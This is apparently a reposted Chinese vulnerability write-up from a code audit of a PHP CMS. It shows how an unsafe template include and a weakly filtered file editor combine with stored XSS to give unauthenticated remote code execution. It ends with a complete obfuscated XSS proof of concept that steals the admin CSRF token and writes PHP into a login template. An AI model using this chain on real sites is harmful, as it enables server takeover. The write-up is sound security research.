#  记一次代码审计中RCE挖掘及POC编写   
 黑白之道   2023-11-26 08:36  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif "")  
  
文章来源：先知社区  
  
文章链接：  
https://xz.aliyun.com/t/13008  
  
作者：雨下整夜  
  
在前面熟悉代码的过程中，可以注意到此CMS的模板引入方式。以catalog_add.php文件为例，直接采用了include来将htm文件包含，而不是将php文件处理的数据放入模板中。也许对于程序员来讲，呈现的效果是一样的，但是在php中，include的使用需要更谨慎才对。include XXInclude('templets/catalog_add.htm');  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaOKjfiaN6MA1vuADevl5pfd3xZICvcjJ229yDNyG5ic5gJIJSUM3ictORibtS4Ttqo7RSr2dtbg0NoHA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
问题出现在src/admin/file_manage_control.php文件，此文件是用于处理文件操作，确保安全性和有效性。但是其中的防护策略并不完全有效，所以出现了漏洞。  
漏洞代码位于文件修改功能  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaOKjfiaN6MA1vuADevl5pfdWsYibD7Icu0Khp8Nd3sdNgN9MsMfBXPBgD0xibcjwicIco8ejG1rdE6EQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
查看变量处理，针对变量$activepath，处理的关键逻辑在15、16、17行。  
简单来说主要目的是规范化和确保 $activepath 变量表示的文件路径是安全的，不包含目录遍历或多余的斜杠。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaOKjfiaN6MA1vuADevl5pfdHXvqUUI6QADlt6XyHbEuuWiaZicl58pvJzREjoL1DQFgQL5CBKp886IQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
针对变量$filename，处理的关键逻辑在44-48行。  
简单来讲目的是确保文件名是安全的，不包含目录遍历攻击所需的..  
，并限制可以上传或编辑的文件扩展名不能为(php|pl|cgi|asp|aspx|jsp|php5|php4|php3|shtm|shtml)其中的任意项。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaOKjfiaN6MA1vuADevl5pfdJKSQjJAK0vO4e7udcTtEzRXzPBm4O3BvrnIH3iakLqLnjjRUEQ60JTg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
有防御，但是不太严。所以绕过一下即可成功修改意料之外的文件内容  
1.因为其只防御了目录遍历，所以并不限制统一目录下的文件夹名  
2.因为其限制的文件名后缀是(php|pl|cgi|asp|aspx|jsp|php5|php4|php3|shtm|shtml)，所以此系统的模板文件的后缀htm会是合法的。  
所以，此时可以将任意文件内容写入到htm文件中，为什么要写入到htm文件？因为此系统所使用的模板文件就是htm，而我前面提到了直接采用了include来将htm文件包含，而不是将php文件处理的数据放入模板中会造成的危害也就是这里体现出来：将php脚本放在htm中，当被include的时候，php脚本便会执行。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaOKjfiaN6MA1vuADevl5pfdnkjl3sxcFSf6WmzkFSVhCEoUFchWPSQYhTtTIrFt6Vic3GshN1nic4Rw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaOKjfiaN6MA1vuADevl5pfdB1VGxibC3L1mcF6tzJFUcXqQW3AY8gkQFCkC2n9iboRe5pfprsu1XEuQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
## 组合拳进行危害提升  
  
上面可以通过模板文件写入的方式RCE了，但是很鸡肋，这样只能是后台rce，这时候想将漏洞变成未授权的RCE只需要解决两个问题：  
1 只有管理员权限才能访问/admin路由下的大部分文件  
2 只有管理员权限才有修改文件的功能权限。  
第一个问题可以通过login文件来解决，因为登录页面当然不需要任何的权限即可访问。  
第二个问题就是通过XSS、或者CSRF打出组合拳或者直接尝试找到SQL注入登录后台就能解决。  
那接下来的思路就是通过找到有效的XSS/CSRF/SQL注入，让我们能以管理员的身份写入shell到/admin/login.htm文件中。  
进入到src/admin/article_edit.php文件，此文件为系统中的文档修改功能的逻辑处理文件。  
关注此处148行有一处疑似有问题的SQL语句。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaOKjfiaN6MA1vuADevl5pfdpEytCjcIYpZvyDPFxJPiaibkbiaepibbzLmRTnrhwn0UGicNUe3rSOBQsGA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
这个查询语句的目的是将一条记录跟新到名为 $addtable  
(此处即biz_arctype) 的数据库表中，关键在于此处没有使用参数化查询来防止安全问题。  
```
$query = "UPDATE `#@__archives` SET typeid='$typeid',typeid2='$typeid2',sortrank='$sortrank',flag='$flag',click='$click',ismake='$ismake',arcrank='$arcrank',money='$money',title='$title',color='$color',writer='$writer',source='$source',litpic='$litpic',pubdate='$pubdate',notpost='$notpost',description='$description',keywords='$keywords',shorttitle='$shorttitle',filename='$filename',dutyadmin='$adminid',weight='$weight' WHERE id='$id'; ";
```  
  
进一步跟进dsql->ExecuteNoneQuery函数，发现系统是在执行SQL的时候做了安全检查，跟进CheckSql，发现是有针对SQL注入存在详细的过滤，不排除有绕过SQL的手法，但是此处选择另一条简单的利用思路。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaOKjfiaN6MA1vuADevl5pfdvs1APuUvp7hlrKEsaKEnfgZ8jnQunwN7GWhq4CkykXW1fD1DU4IsAQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaOKjfiaN6MA1vuADevl5pfdrwbkkUFlGXDtcYdcZblJlyx9M3DN2TI9IuwpAw4iaruKlbptRwuvp9Q/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
因为没有对参数做xss的过滤，所以此时考虑利用存储型的XSS漏洞即可，去功能点用payload插入含有输出点的body参数进行测试，发现成功执行。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaOKjfiaN6MA1vuADevl5pfdiaqd7e84XeY16RhFzebHSHWBYbEYHMTrmD3vJ2gDHWs9JicL6ib8GVk3w/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaOKjfiaN6MA1vuADevl5pfdDq9ZnU7s43A4GbN4A4gGiagvJxogZBvFJfuddcBmuskibP4HDKl0WEibA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
## 整合思路编写POC  
  
思路也是比较清晰1.攻击者利用普通用户的文档编辑功能，将XSS的payload藏在文档中。2.管理员用户对普通用户的文档进行审核时执行XSS的payload，在不知情的情况下将shell写在/admin/login.htm文件中3.getshell，地址为：http://xxx/admin/login.phpPOC和部分截图放在下面  
```
//将此脚本放在浏览器控制台执行即可获得payload
var codeString = "//  获取URL\n" +
    "var url = document.URL;\n" +
    "var domainMatch = url.match(/^(https?:\\/\\/[^/]+)/);\n" +
    "var domain = domainMatch[1];\n" +
    "\n" +
    "//  获取Cookie\n" +
    "var cookieString = document.cookie;\n" +
    "\n" +
    "// 创建一个新的 form 元素\n" +
    "var form = document.createElement(\"form\");\n" +
    "\n" +
    "// 设置 form 的属性\n" +
    "form.setAttribute(\"method\", \"POST\");\n" +
    "form.setAttribute(\"action\", domain+\"/admin/file_manage_control.php\");\n" +
    "\n" +
    "// 使用正则表达式匹配 dede_csrf_token 的值\n" +
    "var csrfTokenMatch = cookieString.match(/dede_csrf_token=([^;]+)/);\n" +
    "\n" +
    "// 提取匹配到的值\n" +
    "var csrfTokenValue = csrfTokenMatch[1]; // 提取匹配到的值\n" +
    "\n" +
    "// 创建并设置隐藏字段\n" +
    "var fields = [\n" +
    "  { name: \"fmdo\", value: \"edit\" },\n" +
    "  { name: \"backurl\", value: \"\" },\n" +
    "  { name: \"_csrf_token\", value: csrfTokenValue },\n" +
    "  { name: \"activepath\", value: \"/admin/templets\" },\n" +
    "  { name: \"filename\", value: \"login.htm\" },\n" +
    "  { name: \"str\", value: \"1<?php phpinfo();?>\" },\n" +
    "  { name: \"B1\", value: \"\" }\n" +
    "];\n" +
    "\n" +
    "// 遍历字段数组并创建相应的 input 元素\n" +
    "fields.forEach(function (field) {\n" +
    "  var input = document.createElement(\"input\");\n" +
    "  input.setAttribute(\"type\", \"hidden\");\n" +
    "  input.setAttribute(\"name\", field.name);\n" +
    "  input.setAttribute(\"value\", field.value);\n" +
    "  form.appendChild(input);\n" +
    "});\n" +
    "\n" +
    "// 创建一个提交按钮并添加到 form 中\n" +
    "var submitButton = document.createElement(\"input\");\n" +
    "submitButton.setAttribute(\"type\", \"submit\");\n" +
    "submitButton.setAttribute(\"value\", \"Submit request\");\n" +
    "form.appendChild(submitButton);\n" +
    "\n" +
    "// 将 form 添加到文档中并自动提交\n" +
    "document.body.appendChild(form);\n" +
    "form.submit();";
var asciiArray = [];
for (var i = 0; i < codeString.length; i++) {
    asciiArray.push(codeString.charCodeAt(i));
}
var asciiString = asciiArray.join(',');
console.log('<img src="x"\n  onerror="eval(String.fromCharCode('+asciiString+'))">')
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuaOKjfiaN6MA1vuADevl5pfdj2BBuhpSWmKCiaskOZT7m6V5LtOls0em4BDKHzvDJwvB2niadsHl8dGw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
黑白之道发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！  
  
如侵权请私聊我们删文  
  
  
**END**  
  
  
